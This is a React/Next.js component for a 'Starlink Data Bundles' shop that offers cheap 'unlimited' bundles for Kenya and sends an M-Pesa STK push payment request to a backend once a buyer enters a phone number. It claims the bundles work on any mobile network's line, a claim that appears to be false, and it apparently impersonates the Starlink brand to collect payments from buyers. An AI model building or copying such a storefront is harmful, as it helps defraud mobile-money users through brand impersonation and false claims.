"use client";

import React, { useState } from "react";

type Category = "all" | "daily" | "weekly" | "monthly" | "unlimited";

type Bundle = {
  id: string;
  category: Category;
  title: string;
  subtitle: string;
  price: number;
  badge?: "HOT" | "POPULAR" | "VALUE";
};

const categoryOrder: Record<Category, number> = {
  unlimited: 0,
  daily: 1,
  weekly: 2,
  monthly: 3,
  all: 99,
};

/* ✅ UPDATED OFFERS ONLY */
const bundles: Bundle[] = [
  {
    id: "u1",
    category: "unlimited",
    title: "7 Days - Unlimited",
    subtitle: "One week unlimited access",
    price: 299,
  },
  {
    id: "u2",
    category: "unlimited",
    title: "14 Days - Unlimited",
    subtitle: "Two weeks unlimited access",
    price: 499,
  },
  {
    id: "u3",
    category: "unlimited",
    title: "50GB - Full Month",
    subtitle: "Monthly capped data",
    price: 699,
  },
  {
    id: "u4",
    category: "unlimited",
    title: "Full Month - Unlimited",
    subtitle: "Unlimited for 30 days",
    price: 899,
  },
];

export default function StarlinkBundles() {
  const [selected, setSelected] = useState<Category>("all");
  const [loadingId, setLoadingId] = useState<string | null>(null);
  const [message, setMessage] = useState<string | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [activeBundle, setActiveBundle] = useState<Bundle | null>(null);
  const [phone, setPhone] = useState("");

  const filtered =
    selected === "all"
      ? [...bundles].sort(
          (a, b) => categoryOrder[a.category] - categoryOrder[b.category]
        )
      : bundles.filter((b) => b.category === selected);

  const handleBuy = async () => {
    if (!activeBundle) return;
    if (!phone) {
      setMessage("Please enter a phone number");
      return;
    }

    setLoadingId(activeBundle.id);
    setMessage("Processing payment...");

    const BACKEND_URL =
      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: activeBundle.price,
          local_id: `O${Date.now().toString(36)}${crypto
            .getRandomValues(new Uint8Array(2))
            .join("")}`,
          transaction_desc: `Payment for ${activeBundle.title}`,
        }),
      });

      const data = await res.json();

      if (data.status) {
        setMessage(`STK Push sent! Check your phone to complete payment.`);
      } else {
        setMessage("Payment failed. Try again.");
      }
    } catch {
      setMessage("Error sending payment. Try again later.");
    } finally {
      setLoadingId(null);
      setShowModal(false);
      setTimeout(() => setMessage(null), 5000);
    }
  };

  return (
    <div className="min-h-screen bg-[#f8fcfa]">
      <header className="bg-green-800 py-8">
        <div className="max-w-6xl mx-auto px-4 text-center">
          <h1 className="text-3xl font-semibold text-white">
            Starlink Data Bundles
          </h1>
          <p className="text-green-200 text-sm mt-1 font-bold">
            Click BUY, works with the line you buy with from any network
          </p>
          <p className="text-green-200 text-sm mt-1">
            Reliable high-speed internet for Kenya
          </p>
        </div>
      </header>

      <div className="max-w-6xl mx-auto px-4 mt-6">
        <div className="flex flex-wrap gap-2 justify-center">
          {["unlimited", "all", "daily", "weekly", "monthly"].map((cat) => (
            <button
              key={cat}
              onClick={() => setSelected(cat as Category)}
              className={`px-4 py-1.5 rounded-full text-xs font-medium ${
                selected === cat
                  ? "bg-green-700 text-white"
                  : "bg-white text-green-700 border border-green-300"
              }`}
            >
              {cat === "all" ? "All Bundles" : cat}
            </button>
          ))}
        </div>
      </div>

      <main className="max-w-6xl mx-auto px-4 py-8">
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5">
          {filtered.map((bundle, index) => (
            <div
              key={`${selected}-${index}-${bundle.id}`}
              className="relative bg-white rounded-lg p-4 border-2 border-green-500"
            >
              {bundle.badge && (
                <span className="absolute top-2 right-2 text-[10px] px-2 py-0.5 rounded-full bg-green-100 text-green-700 font-semibold">
                  {bundle.badge}
                </span>
              )}

              <h3 className="text-sm font-semibold">{bundle.title}</h3>
              <p className="text-xs text-gray-500">{bundle.subtitle}</p>

              <div className="mt-4 flex justify-between items-end">
                <div className="text-lg font-bold text-green-700">
                  Ksh {bundle.price}
                </div>
                <button
                  onClick={() => {
                    setActiveBundle(bundle);
                    setShowModal(true);
                  }}
                  className="text-xs px-3 py-1.5 rounded-full bg-green-600 text-white"
                >
                  BUY
                </button>
              </div>
            </div>
          ))}
        </div>
      </main>

      {showModal && activeBundle && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 px-4">
          <div className="bg-green-50 max-w-sm w-full p-6 rounded-xl shadow-xl relative">
            <button
              onClick={() => setShowModal(false)}
              className="absolute top-3 right-3 text-green-700 font-bold text-lg"
            >
              &times;
            </button>
            <h2 className="text-xl font-semibold text-green-800 mb-2">
              Starlink Payment
            </h2>
            <p className="text-green-700 text-xs mb-3 italic">
              Enter M-Pesa number below you will be prompted to enter your PIN on
              your phone.
            </p>
            <p className="text-green-700 text-sm mb-4">
              {activeBundle.title} - Ksh {activeBundle.price}
            </p>
            <input
              type="tel"
              placeholder="Enter your M-Pesa number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full px-4 py-2 border border-green-300 rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-green-700"
            />
            <button
              onClick={handleBuy}
              disabled={loadingId === activeBundle.id}
              className="w-full bg-green-600 text-white font-semibold py-2 rounded-md hover:bg-green-800 transition"
            >
              {loadingId === activeBundle.id
                ? "Processing..."
                : `Pay Ksh ${activeBundle.price}`}
            </button>
          </div>
        </div>
      )}

      {message && (
        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 bg-green-700/90 text-white px-6 py-3 rounded-2xl shadow-lg text-sm z-50">
          {message}
        </div>
      )}

      {/* ✅ ONLY FOOTER TEXT UPDATED */}
      <footer className="text-center text-gray-400 text-[11px] py-5">
        &copy; {new Date().getFullYear()} Starlink Bundles — Customer Care:
        0755997593
      </footer>
    </div>
  );
}
